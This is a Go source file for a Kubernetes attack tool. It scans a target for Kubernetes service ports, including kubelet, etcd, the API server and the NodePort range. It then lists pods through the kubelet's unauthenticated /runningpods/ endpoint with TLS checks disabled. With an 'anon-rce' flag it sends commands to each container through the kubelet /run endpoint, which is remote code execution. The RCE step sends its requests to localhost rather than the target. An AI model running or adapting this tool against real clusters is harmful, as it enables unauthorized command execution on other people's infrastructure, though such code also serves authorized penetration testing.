package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"strings"

	"github.com/pborman/getopt/v2"
)

var scanNode = false
var target string
var anonRce = false

type RunningPods struct {
	Kind       string `json:"kind"`
	APIVersion string `json:"apiVersion"`
	Metadata   struct {
	} `json:"metadata"`
	Items []struct {
		Metadata struct {
			Name              string      `json:"name"`
			Namespace         string      `json:"namespace"`
			UID               string      `json:"uid"`
			CreationTimestamp interface{} `json:"creationTimestamp"`
		} `json:"metadata"`
		Spec struct {
			Containers []struct {
				Name      string `json:"name"`
				Image     string `json:"image"`
				Resources struct {
				} `json:"resources"`
			} `json:"containers"`
		} `json:"spec"`
		Status struct {
		} `json:"status"`
	} `json:"items"`
}

func parse_pod(target string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get("https://" + target + ":10250/runningpods/")
	if err != nil {
		fmt.Print("Fail execute request")
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Print("Fail to read body")
	}

	input := &RunningPods{}

	err = json.Unmarshal(body, &input)
	if err != nil {
		log.Fatalln(err)
	}

	if anonRce {
		anon_rce(input)
	}

}

func anon_rce(runpod *RunningPods) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	for i := 0; i < len(runpod.Items); i++ {
		found := false
		for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
			namespace := runpod.Items[i].Metadata.Namespace
			pod := runpod.Items[i].Metadata.Name
			container := runpod.Items[i].Spec.Containers[j].Name
			url := "https://localhost:10250/run/" + namespace + "/" + pod + "/" + container
			method := "POST"
			payload := strings.NewReader("cmd=ls")

			client := &http.Client{}
			req, err := http.NewRequest(method, url, payload)

			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

			res, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer res.Body.Close()

			body, err := io.ReadAll(res.Body)
			if err != nil {
				fmt.Println(err)
				return
			}
			if body != nil && !strings.Contains(string(body), "failed") {
				found = true
				fmt.Println(string(body))
				break
			}
		}
		if found {
			break
		}
	}

}

func send_http_request(target string, port int, endpoint string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get(target + ":" + strconv.Itoa(port) + endpoint)
	if err != nil {
		fmt.Printf("Port %d not open on %s \n", port, target)
	} else {
		fmt.Printf("Port: %d, status: %d \n", port, resp.StatusCode)
		defer resp.Body.Close()
	}
}

func check_ports(target string) {
	target = "http://" + target
	endpoint := "/"
	knownPort := []int{443, 2379, 6666, 4194, 6443, 8443, 8080, 10250, 10255, 10256, 9099, 6782, 6783, 6784, 44134}

	if scanNode {
		for i := 30000; i <= 32767; i++ {
			knownPort = append(knownPort, i)
		}
	}
	for _, port := range knownPort {
		if port == 10250 {
			target := strings.Replace(target, "http", "https", 1)
			endpoint = "/metrics"
			send_http_request(target, port, endpoint)
		} else {

			send_http_request(target, port, endpoint)
		}

	}
}

func main() {

	getopt.FlagLong(&target, "target", 't', "target (IP or domain)").Mandatory()
	getopt.FlagLong(&scanNode, "node-scan", 0, "Enable/disable node port scan").SetOptional()
	getopt.FlagLong(&anonRce, "anon-rce", 0, "Directly try to RCE if kubelet API is open").SetOptional()
	getopt.Parse()

	check_ports(target)
	parse_pod(target)
}
